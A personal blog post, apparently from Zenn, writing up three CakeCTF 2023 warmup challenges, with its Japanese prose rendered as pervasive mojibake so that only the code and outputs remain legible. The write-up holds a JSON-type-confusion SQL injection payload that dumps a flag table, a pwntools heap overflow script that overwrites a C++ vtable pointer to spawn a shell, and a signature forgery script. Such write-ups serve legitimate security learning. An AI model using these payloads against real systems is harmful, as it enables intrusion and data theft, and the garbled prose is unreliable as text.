---
title: "ã‚²ãƒ³ã‚¬ãƒ¼ã¬ã„ã¨æŒ‘ã‚“ã CakeCTF 2023ã€ä¸€å¿œwriteupã€‘"
emoji: "ğŸ‰"
type: "idea" # tech: æŠ€è¡“è¨˜äº‹ / idea: ã‚¢ã‚¤ãƒ‡ã‚¢
topics: ["CTF"]
published: true
---

## ã¯ã˜ã‚ã«

https://2023.cakectf.com/

CakeCTF 2023 ã«ã‚½ãƒ­ãƒãƒ¼ãƒ  ilohas ã§å‚åŠ ã—ã¾ã—ãŸã€‚ã§ã™ãŒã€ä»Šå›ã¯å­¦åœ’ç¥­ãŒã‚ã£ã¦ warmup ã® 3 å•ã—ã‹è§£ã‘ã¦ã„ã¾ã›ã‚“ï¼ã€€ã¨ã„ã†ã‚ã‘ã§ã€åˆ†é‡ãŒå…¨ç„¶è¶³ã‚Šãªã„ã®ã§é–‹å‚¬æ—¥ 11 æœˆ 11 æ—¥ã®ãƒ­ã‚°ã‚’ä¸¸ã€… writeup ã¨ã—ã¾ã™ã€‚

## èµ·åºŠ

å­¦åœ’ç¥­ãŒ 10 æ™‚ã€ç§»å‹•ã« 40 åˆ†ãªã®ã§ã€æ—©èµ·ãã—ã‚ˆã†ã¨æ€ã£ãŸã‚‰å¤±æ•—ï¼ã€€è¦šé†’ã«æ™‚é–“ãŒã‹ã‹ã‚‹ã‚¿ã‚¤ãƒ—ãªã®ã§ã€9 æ™‚ã ã¨ãŠãã‚‰ãé–“ã«åˆã‚ãªã„ã§ã—ã‚‡ã†ã€‚

![](https://storage.googleapis.com/zenn-user-upload/855cbbb66513-20231112.jpg)

ã¨ã„ã†ã‚ã‘ã§è«¦ã‚ã¦ 11 æ™‚ã¾ã§äºŒåº¦å¯ã—ã¾ã—ãŸã€‚

## æ˜¼ã”ã¯ã‚“

æµçŸ³ã«ãã‚ãã‚å‡ºç™ºã—ãªã„ã¨ãƒã‚ºã‚¤ã¨ã„ã†ã“ã¨ã§ã€å­¦æ ¡æ–¹é¢ã®ã™ãå®¶ã‚’ç›®æŒ‡ã—ã¾ã—ãŸã€‚ã™ãå®¶ã®å†™çœŸã¯ãªã‹ã£ãŸã®ã§ã€ä»£ã‚ã‚Šã«å…ˆæ—¥é«˜çŸ¥ã«åˆå‡ºåº—ã—ãŸæ¾å±‹ã®å†™çœŸã‚’è¼‰ã›ã¦ãŠãã¾ã™ã€‚æ¾å±‹ã§å¤§è¡Œåˆ—ã¨ã„ã†çç™¾æ™¯ãŒè¦‹ã‚‰ã‚Œã¾ã™ã€‚

https://www.kochinews.co.jp/article/detail/687449

![](https://storage.googleapis.com/zenn-user-upload/3e06fc555aef-20231112.jpg)
![](https://storage.googleapis.com/zenn-user-upload/abee77c76b8f-20231112.jpg)

## å­¦åœ’ç¥­

æ¨©åˆ©ã¨èº«ãƒãƒ¬å¯¾ç­–ã§è©³ç´°ã¯ä¼ã›ã¾ã™ãŒã€å¤œã¾ã§é©å½“ã«ãƒ–ãƒ©ãƒ–ãƒ©ã—ã¦ã¾ã—ãŸã€‚å¤æœ¬å¸‚ã§ã¯ã‚ˆãã‚ã‹ã‚‰ãªã„æˆ¦åˆ©å“ã‚’ç²å¾—ã—ã¾ã—ãŸã€‚ã‚¯ãƒ¡ãƒ¼ãƒ«ç¾è¡“ã™ã’ãˆã€‚

![](https://storage.googleapis.com/zenn-user-upload/b077b34a6ede-20231112.png)
![](https://storage.googleapis.com/zenn-user-upload/296bc0325132-20231112.png)

ã¤ã„ã§ã«ç ”ç©¶å®¤ã«è¡Œã£ãŸã‚‰ã€æ‰€æœ‰è€…è¡Œæ–¹ä¸æ˜ã®ã‚²ãƒ³ã‚¬ãƒ¼ãŒä»²é–“ã«ãªã‚Šã¾ã—ãŸï¼

![](https://storage.googleapis.com/zenn-user-upload/6975c8d30208-20231112.jpg)

## æ™©ã”ã¯ã‚“

å¸°å®…ã™ã‚‹ã¨å¤œã ã£ãŸã®ã§ã€é›‘ã«æ™©ã”ã¯ã‚“ã‚’ä½œã£ã¦é£Ÿã¹ã¾ã—ãŸã€‚ææ–™ãŒç„¡ã„ã®ã§ã€ã‚«ãƒ”ã‚«ãƒ”ã®ã­ãã‚’è¼‰ã›ãŸå¤©æ´¥é£¯ã§ã™ã€‚åµä¾¿åˆ©ã€‚

![](https://storage.googleapis.com/zenn-user-upload/dc183ba0cdda-20231112.png)

## ã‚ˆã†ã‚„ã CakeCTF å‚æˆ¦

ãµã¨äºˆå®šè¡¨ã‚’è¦‹ãŸã‚‰ã€CakeCTF ãŒå…¥ã£ã¦ã¾ã—ãŸã€‚æ€¥ã„ã§ Register ã—ã¦å‚æˆ¦ã§ã™ã€‚ãŠä¾›ã¯ã‚„ã¯ã‚Šã‚²ãƒ³ã‚¬ãƒ¼ã§ã™ã€‚è¨ˆç®—ã‚¹ãƒšãƒ¼ã‚¹ã‚’å é ˜ã—ã¦ã„ã¾ã™ãŒã€ã‚²ãƒ³ã‚¬ãƒ¼ãŒä»£ã‚ã‚Šã«è¨ˆç®—ã—ã¦ãã‚Œã¾ã™ã€‚

![](https://storage.googleapis.com/zenn-user-upload/bb41370cfe4f-20231112.jpg)

## Welcome

Welcome å•é¡Œã¯ Discord ã«ã‚ã‚‹ãƒ•ãƒ©ã‚°ã‚’å…¥åŠ›ã™ã‚‹ã¨ã„ã†ã‚‚ã®ã§ã—ãŸã€‚ã‚±ãƒ¼ã‚­é£Ÿã¹ãŸã„ãªã€‚è²·ã£ã¦ã“ã‚ˆã†ã‹ã¨æ‚©ã¿ã¾ã™ãŒã€å¤œä¸­ã«é£Ÿã¹ã¦ã„ã„ã‚‚ã®ã§ã¯ãªã„ã®ã§æ–­å¿µã—ã¾ã™ã€‚

![](https://storage.googleapis.com/zenn-user-upload/52975fa435de-20231112.png)

## Country DB [Web]

Solve æ•°ãŒã‚„ãŸã‚‰å¤šã„ Web ã® warmup ã«æŒ‘ã¿ã¾ã™ã€‚ã‚µãƒ¼ãƒ“ã‚¹ã‚’è¦‹ã¦ã¿ãŸã¨ã“ã‚ã€2 æ–‡å­—ã®å›½åã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã™ã‚‹ã¨å›½åã‚’è¡¨ç¤ºã—ã¦ãã‚Œã‚‹ã‚ˆã†ã§ã™ã€‚

![](https://storage.googleapis.com/zenn-user-upload/a41fef537bb7-20231112.png)

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒé…å¸ƒã•ã‚Œã¦ã„ã‚‹ã®ã§ã€ä¸€ã¤ãšã¤èª­ã‚“ã§ã„ãã¾ã™ã€‚`init_db.py` ã‚’è¦‹ã‚‹ã¨ã€

- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¯ SQLite3
- ãƒ•ãƒ©ã‚°ã¯ãƒ†ãƒ¼ãƒ–ãƒ« flag ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹

ã¨ã„ã†ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

```python:init.py
import sqlite3
import os

FLAG = os.getenv("FLAG", "FakeCTF{*** REDACTED ***}")

conn = sqlite3.connect("database.db")
conn.execute("""CREATE TABLE country (
  code TEXT NOT NULL,
  name TEXT NOT NULL
);""")
conn.execute("""CREATE TABLE flag (
  flag TEXT NOT NULL
);""")
conn.execute(f"INSERT INTO flag VALUES (?)", (FLAG,))
[snip...]
```

æ¬¡ã« `app.py` ã‚’è¦‹ã‚‹ã¨ã€å¦‚ä½•ã«ã‚‚ SQLi ã‚’ã—ã¦ãã‚Œã¨è¨€ã£ã¦ã„ã‚‹é–¢æ•°ãŒã‚ã‚Šã¾ã™ã€‚

```python:app.py
def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]
```

ã§ã™ãŒã€`code` ã¯ 2 æ–‡å­—ä»¥å†…ã§ã‹ã¤ `'` ã‚’å«ã‚“ã§ã¯ã„ã‘ãªã„ã¨ã„ã†æ¡ä»¶ãŒã‚ã‚Šã¾ã—ãŸã€‚

```python:app.py
@app.route('/api/search', methods=['POST'])
def api_search():
    req = flask.request.get_json()
    if 'code' not in req:
        flask.abort(400, "Empty country code")

    code = req['code']
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")

    name = db_search(code)
    if name is None:
        flask.abort(404, "No such country")

    return {'name': name}
```

ã“ã“ã§ Web ãŒè‹¦æ‰‹ãªåƒ•ã¯ã€Œãªã‚‰ SQLi ã˜ã‚ƒãªã„ã®ã‹ï¼Ÿã€ã¨æ€ã„ã¾ã—ãŸã€‚ãŸã ã€ã‚²ãƒ³ã‚¬ãƒ¼ã‚’è¦‹ã¦ã¿ã‚‹ã¨ã‚„ã£ã±ã‚Š SQLi ãªã‚“ã˜ã‚ƒãªã„ã‹ã£ã¦æ°—ãŒã—ã¦ãã¾ã—ãŸã€‚

ã‚ˆãã‚ˆã `app.py` ã‚’è¦‹ç›´ã—ã¦ã¿ã‚‹ã¨ã€JSON ã®ä¸­èº«ã® type ãŒæ¤œè¨¼ã•ã‚Œã¦ã„ãªã„ã“ã¨ã«æ°—ãŒä»˜ãã¾ã—ãŸã€‚ãªã‚‰ã€å¤šé‡æ§‹é€ ã«ã—ã¦é€ã£ã¦ã‚„ã‚ã†ã¨ã€‚ã¨ã„ã†ã‚ã‘ã§è‰²ã€…ã¨ãƒ­ãƒ¼ã‚«ãƒ«ã§è©¦ã—ãŸã¨ã“ã‚ã€

```
{"code":{"') UNION SELECT flag from flag; --": "a", "B": "b"}}
```

ã«ã™ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ãªã‚¯ã‚¨ãƒªã«ãªã£ã¦ãƒ•ãƒ©ã‚°ãŒå‡ºåŠ›ã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚

```
SELECT name FROM country WHERE code=UPPER('{"') UNION SELECT flag from flag; --": 'a', 'B': 'b'}')
```

ãƒ•ãƒ©ã‚° GET ã ãœï¼

![](https://storage.googleapis.com/zenn-user-upload/fa7c2be10bb1-20231112.png)
![](https://storage.googleapis.com/zenn-user-upload/2e573a2bb2f1-20231112.png)

## vtable4b [Pwn]

æ¥ç¶šã—ã¦ã¿ã‚‹ã¨ã€C++ã® exploit ã¿ãŸã„ã§ã™ã€‚

```
$ nc vtable4b.2023.cakectf.com 9000
Today, let's learn how to exploit C++ vtable!
You're going to abuse the following C++ class:

  class Cowsay {
  public:
    Cowsay(char *message) : message_(message) {}
    char*& message() { return message_; }
    virtual void dialogue();

  private:
    char *message_;
  };

An instance of this class is allocated in the heap:

  Cowsay *cowsay = new Cowsay(new char[0x18]());

You can
 1. Call `dialogue` method:
  cowsay->dialogue();

 2. Set `message`:
  std::cin >> cowsay->message();

Last but not least, here is the address of `win` function which you should call to get the flag:
  <win> = 0x562e91c9561a

1. Use cowsay
2. Change message
3. Display heap
>
```

vtable ãŒä½•ã‹ã‚ˆãçŸ¥ã‚Šã¾ã›ã‚“ãŒã€ã¨ã‚Šã‚ãˆãš heap ã‚’è¡¨ç¤ºã—ã¦ã¿ã¾ã™ã€‚

```
> 3

  [ address ]    [ heap data ]
               +------------------+
0x562e9240bea0 | 0000000000000000 |
               +------------------+
0x562e9240bea8 | 0000000000000021 |
               +------------------+
0x562e9240beb0 | 0000000000000000 | <-- message (= '')
               +------------------+
0x562e9240beb8 | 0000000000000000 |
               +------------------+
0x562e9240bec0 | 0000000000000000 |
               +------------------+
0x562e9240bec8 | 0000000000000021 |
               +------------------+
0x562e9240bed0 | 0000562e91c98ce8 | ---------------> vtable for Cowsay
               +------------------+                 +------------------+
0x562e9240bed8 | 0000562e9240beb0 |  0x562e91c98ce8 | 0000562e91c956e2 |
               +------------------+                 +------------------+
0x562e9240bee0 | 0000000000000000 |                 --> Cowsay::dialogue
               +------------------+
0x562e9240bee8 | 000000000000f121 |
               +------------------+
```

message ã« BOF ã®è„†å¼±æ€§ãŒã‚ã£ãŸã®ã§ã€ã“ã®è¡¨ç¤ºã‚’é ¼ã‚Šã« `win` ã‚’å‘¼ã³å‡ºã—ã¦ã¿ã‚ˆã†ã¨æ€ã„ã¾ã—ãŸã€‚è¦‹ãŸã¨ã“ã‚ã€vtable for Cowsay ã®ãƒã‚¤ãƒ³ã‚¿ã‚’ `win` ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã—ãŸã‚‰ã‚ˆã•ãã†ã§ã™ã€‚

```python:solve.py
from pwn import *

s = remote("vtable4b.2023.cakectf.com", 9000)
s.recvuntil(b"<win> =")
addr_win = int(s.recvline().strip(), 16)
offset = 0x20

s.sendlineafter(b"> ", b"3")
data = s.recvuntil(b"f121")
addrs = []
for d in data.decode().split():
    if d[:2] == "0x":
        addrs.append(d)
vtable_addr = int(addrs[7], 16)

s.sendlineafter(b"> ", b"2")
payload = b"A"*offset
payload += p64(vtable_addr)
payload += p64(addr_win)
s.sendlineafter(b"Message: ", payload)
s.interactive()
```

ãã®çŠ¶æ…‹ã§ heap ã‚’è¡¨ç¤ºã™ã‚‹ã¨ã“ã®ã‚ˆã†ã«ãªã‚Šä¸Šæ‰‹ãã„ã£ã¦ãã†ã§ã™ã€‚

```
  [ address ]    [ heap data ]
               +------------------+
0x55a79c901ea0 | 0000000000000000 |
               +------------------+
0x55a79c901ea8 | 0000000000000021 |
               +------------------+
0x55a79c901eb0 | 4141414141414141 |
               +------------------+
0x55a79c901eb8 | 4141414141414141 |
               +------------------+
0x55a79c901ec0 | 4141414141414141 |
               +------------------+
0x55a79c901ec8 | 4141414141414141 |
               +------------------+
0x55a79c901ed0 | 000055a79c901ed8 | ---------------> vtable for Cowsay (corrupted)
               +------------------+                 +------------------+
0x55a79c901ed8 | 000055a79c24261a |  0x55a79c901ed8 | 000055a79c24261a |
               +------------------+                 +------------------+
0x55a79c901ee0 | 0000000000000000 |                 --> <win> function
               +------------------+
0x55a79c901ee8 | 000000000000f121 |
               +------------------+
```

å¾Œã¯ Use ã—ã¦ã‚·ã‚§ãƒ« GET ã§ã™ã€‚

```
1. Use cowsay
2. Change message
3. Display heap
> $ 1
[+] You're trying to use vtable at 0x55a79c901ed8
[+] Congratulations! Executing shell...
[snip...]
$ cat /flag-806cb9c9719379667ca5616d9c8210f1.txt
CakeCTF{vt4bl3_1s_ju5t_4n_arr4y_0f_funct1on_p0int3rs}
```

å®Œå…¨ãªã‚‹æ¥å¾… Pwn ãƒ—ãƒ¬ã‚¤ã§ã™ãŒã€æˆ‘ãŒå®¶ã®ãƒŸãƒ‹ãƒ–ãƒ¼ã‚¹ã‚¿ãƒ¼é”ã‚‚å–œã‚“ã§ã„ãã†ã§ã™ã€‚

![](https://storage.googleapis.com/zenn-user-upload/9d0a2ab08505-20231112.png)

## simple signature [Crypto]

### å•é¡Œ

$p, g$ : å…¬é–‹

#### éµä½œæˆ

- $x, y, w$ : å¤§ãã„ä¹±æ•°
- $v = wy \bmod{p-1}$
- $u = (wx - 1)v^{-1} \bmod{p-1}$
- $\text{skey} = (x,y,u), \text{vkey} = (w, v)$
- $\text{skey}$ ã¯ç§˜å¯†ã€$\text{vkey}$ ã¯å…¬é–‹

#### ç½²å

- $m$ : å¹³æ–‡ã®ãƒãƒƒã‚·ãƒ¥å€¤ï¼ˆsha512ï¼‰
- $\text{skey} = (x,y,u)$
- $r$ : å¤§ãã„ä¹±æ•°
- $s = g^{xm + ry} \bmod{p}$
- $t = g^{um + r} \bmod{p}$
- $\text{sig} = (s,t)$

#### æ¤œè¨¼

- $m$ : å¹³æ–‡ã®ãƒãƒƒã‚·ãƒ¥å€¤ï¼ˆsha512ï¼‰
- $\text{sig} = (s,t)$
- $\text{vkey} = (w, v)$
- $g^m \equiv s^w t^{-v} \pmod{p}$ ã‹ã©ã†ã‹

#### ã‚µãƒ¼ãƒãƒ¼ã®æ©Ÿèƒ½

- `magic_word` ä»¥å¤–ã®ç½²å
- æ¤œè¨¼ â†’ `magic_word` ã§ OK ã ã£ãŸã‚‰ãƒ•ãƒ©ã‚°ã‚’å‡ºåŠ›

### è§£æ³•

ã¾ãšã€$y$ ã¯ $v = wy \bmod{p-1}$ ã‹ã‚‰è¨ˆç®—ã§ãã¾ã™ã€‚

$$
y = vw^{-1} \bmod{p-1}
$$

ã‚ã¨ã¯ $x$ ãŒåˆ¤æ˜ã™ã‚‹ã¨ã„ãã‚‰ã§ã‚‚ç½²åãŒä½œã‚Œã¾ã™ãŒã€ã¨ã¦ã¤ã‚‚ãªã„é›¢æ•£å¯¾æ•°å•é¡Œã‚’è§£ãå¿…è¦ãŒã‚ã‚‹ã®ã§ç„¡ç†ãã†ã§ã™ã€‚ã¨ã„ã†ã‚ã‘ã§ã€ç½²å $(s, t)$ ã‚’åˆ¥ã®æ–¹æ³•ã§ä½œã‚‹ã“ã¨ã‚’è€ƒãˆã¾ã—ãŸã€‚

$m$ ã‚’ `magic_word` ã®ãƒãƒƒã‚·ãƒ¥å€¤ã¨ã—ã¾ã™ã€‚ã“ã®ã¨ãã€æ¤œè¨¼ã‚’çªç ´ã™ã‚‹ãŸã‚ã«æº€ãŸã™ã¹ãå¼ã¯æ¬¡ã®é€šã‚Šã§ã™ã€‚

$$
g^m \equiv s^w t^{-v} \pmod{p}
$$

ã§ã™ãŒã€ã“ã®å¼ã‹ã‚‰ç›´æ¥æ±‚ã‚ã‚‹ã®ã¯å¤§å¤‰ãã†ãªã®ã§ã€åˆ¥ã®é–¢ä¿‚å¼ã‚’æ¢ã™ã“ã¨ã«ã—ã¾ã—ãŸã€‚$u$ ã®å®šç¾©å¼ã‚’å¤‰å½¢ã™ã‚‹ã¨æ¬¡ã®å¼ãŒå¾—ã‚‰ã‚Œã¾ã™ã€‚

$$
uy \equiv x - w^{-1} \pmod{p-1}
$$

æ··ä¹±ã‚’é¿ã‘ã‚‹ãŸã‚ã« $A = w^{-1} \bmod{p-1}$ ã¨ãŠãã¨ã€

$$
uy = x - A + (p-1)k
$$

æ¬¡ã«ã€$s, t$ ã‹ã‚‰ä¹±æ•° $r$ ã‚’æ¶ˆå»ã—ã¾ã™ã€‚

$$
st^{-y} \equiv g^{xm - uym} \pmod{p}
$$

ã•ãã»ã©ã® $uy$ ã¨ãƒ•ã‚§ãƒ«ãƒãƒ¼ã®å°å®šç†ã‹ã‚‰æ¬¡ã®é–¢ä¿‚å¼ãŒå¾—ã‚‰ã‚Œã¾ã™ã€‚

$$
g^{Am} \equiv st^{-y} \pmod{p}
$$

ä¸€æ—¦æ•´ç†ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®æ¡ä»¶ 2 ã¤ã‚’æº€ãŸã™ $(s, t)$ ã‚’æ±‚ã‚ãŸã„ã§ã™ãŒã€æ™®é€šã«é€£ç«‹æ–¹ç¨‹å¼ã¨ã—ã¦è§£ãã®ã¯é›£ã—ãã†ã§ã™ã€‚

$$
\left\{
\begin{array}{l}
g^{Am} \equiv st^{-y} \pmod{p} \\
g^m \equiv s^w t^{-v} \pmod{p}
\end{array}
\right.
$$

ã¨æ€ã„ã¾ã—ãŸãŒã€å®Ÿã¯ã“ã‚Œã‚‰ã®å¼ã¯åŒå€¤ã§ã™ï¼ˆã‚¿ãƒ–ãƒ³ãƒï¼‰ã€‚å†·é™ã«ãªã£ã¦è€ƒãˆã¦ã¿ã‚‹ã¨ã€æ³•ã¯ $p$, $p-1$ ã§ã”ã¡ã‚ƒã”ã¡ã‚ƒã—ã¦ã¾ã™ãŒã€ãƒ•ã‚§ãƒ«ãƒãƒ¼ã®å°å®šç†ã‚’ä½¿ã£ã¦è¨ˆç®—ã™ã‚‹ã¨ãã‚Šã‚ƒãã†ã ã£ã¦ã€‚

ã¨ã„ã†ã‚ã‘ã§ã€çµå±€ã¯æ¬¡ã®ä¸å®šå¼ã‚’è§£ãã ã‘ã§ã™ã€‚æ‚²ã—ã„ãªã€ã‚ã‚æ‚²ã—ã„ãªã€æ³¢å‹•æ‹³ã€‚

$$
g^{Am} \equiv st^{-y} \pmod{p}
$$

$t$ ã®ã»ã†ãŒæ˜ã‚‰ã‹ã«ã‚ã‚“ã©ãã•ã„ã®ã§ã€$t=2$ ã¨é©å½“ã«å›ºå®šã—ã¾ã™ã€‚ã™ã‚‹ã¨ã€$s$ ã¯æ¬¡ã®ã‚ˆã†ã«æ±‚ã¾ã‚Šã¾ã™ã€‚

$$
s = g^{Am} t^{y} \bmod{p}
$$

```python:solve.py
from pwn import *
from hashlib import sha512


def h(m):
    return int(sha512(m.encode()).hexdigest(), 16)


def verify(m, sig, key):
    w, v = key
    s, t = sig

    return pow(g, m, p) == pow(s, w, p) * pow(t, -v, p) % p


conn = remote("crypto.2023.cakectf.com", 10444)
p = int(conn.recvline().split(b"=")[-1])
g = int(conn.recvline().split(b"=")[-1])

vkey = eval(conn.recvline().split(b"=")[-1])

w, v = vkey
y = pow(w, -1, p-1) * v % (p-1)
A = pow(w, -1, p-1)

magic_word = "cake_does_not_eat_cat"
m = h(magic_word)

t = 2
s = pow(g, A*m, p) * pow(t, y, p) % p

assert verify(h(magic_word), (s, t), vkey)

conn.sendlineafter(b": ", b"V")
conn.sendlineafter(b": ", magic_word.encode())
conn.sendlineafter(b": ", str(s).encode())
conn.sendlineafter(b": ", str(t).encode())

print(conn.recvline().decode())
print(conn.recvline().decode())

```

çŒ«ã‚’é£Ÿã¹ãªã„ã§(T_T)

```
$ python3 solve.py
[+] Opening connection to crypto.2023.cakectf.com on port 10444: Done
verified

flag = CakeCTF{does_yoshiking_eat_cake_or_cat?}

[*] Closed connection to crypto.2023.cakectf.com port 10444
```

## ãŠã‚ã‚Šã«

å¤‰ãªæ™‚é–“ã‹ã‚‰å‚åŠ ã—ãŸã®ã§ã€æ®‹å¿µãªãŒã‚‰ã“ã“ã§çµ‚ã‚ã‚Šã§ã™ã€‚ã¾ã¨ã‚‚ãª CTF ã«å‚åŠ ã™ã‚‹ã®ã¯æœ¬å½“ã«ä¹…ã€…ã ã£ãŸã®ã§ã€ã™ã”ãæ¥½ã—ã‹ã£ãŸã§ã™ã€‚å‹˜ãŒæ˜ã‚‰ã‹ã«éˆã£ã¦ã„ã‚‹ã®ã§ãƒªãƒãƒ“ãƒªãŒå¿…è¦ãã†ã§ã™ã€‚

ä»Šå›ã¯ã‚²ãƒ³ã‚¬ãƒ¼ã¨åˆå‚æˆ¦ã—ã¾ã—ãŸãŒã€ã‚¤ã‚±ãƒŠã‚¤è–¬ç‰©ã‚’ã‚„ã£ã¦ã„ã‚‹ã®ã§ã¯ï¼Ÿã¨æ€ã†ãã‚‰ã„ã«ã¯é ­ãŒå›è»¢ã—ã¾ã—ãŸã€‚ä»Šå¾Œã® CTF ã«ã¯ã¬ã„ãŒå¿…é ˆã«ãªã‚Šãã†ã§ã™ã€‚ã¬ã„æœ€é«˜ï¼

ã‚±ãƒ¼ã‚­ã¯ã‚¤ãƒã‚´ã®ã‚·ãƒ§ãƒ¼ãƒˆã‚±ãƒ¼ã‚­æ´¾ã§ã™ã€‚ãƒãƒ¼ã‚ºã‚±ãƒ¼ã‚­ã‚‚è‰¯ã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
